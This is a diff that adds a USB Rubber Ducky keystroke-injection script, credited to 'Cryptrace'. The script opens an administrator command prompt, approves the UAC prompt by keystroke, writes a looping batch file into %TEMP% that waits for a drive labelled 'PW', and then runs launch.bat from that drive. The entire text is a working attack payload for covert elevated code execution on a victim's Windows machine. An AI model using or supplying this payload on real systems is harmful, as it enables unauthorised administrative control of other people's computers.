@@ -1,0 +1,50 @@
+REM Author: Cryptrace
+REM Date: 9/7/2016
+REM Note: MAKE DRIVE LABEL "PW"
+REM ddd
+REM -------------open command prompt with admin privileges
+DELAY 10000
+GUI d
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 3000
+ALT y
+DELAY 500
+STRING CD %TEMP%
+ENTER
+STRING erase /Q holdit.bat
+ENTER
+STRING copy con holdit.bat
+ENTER
+REM holdit.bat
+STRING :while1
+ENTER
+STRING for /f "tokens=3 delims= " %%A in ('echo list volume ^| diskpart ^| findstr "PW"') do (set pwdrive=%%A:)
+ENTER
+STRING if Exist %pwdrive% (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+REM Continue script.
+STRING START %pwdrive%\launch.bat
+ENTER
+STRING exit
+ENTER
+CONTROL z
+ENTER
+STRING holdit.bat
+ENTER
+DELAY 3000
+STRING exit
+ENTER
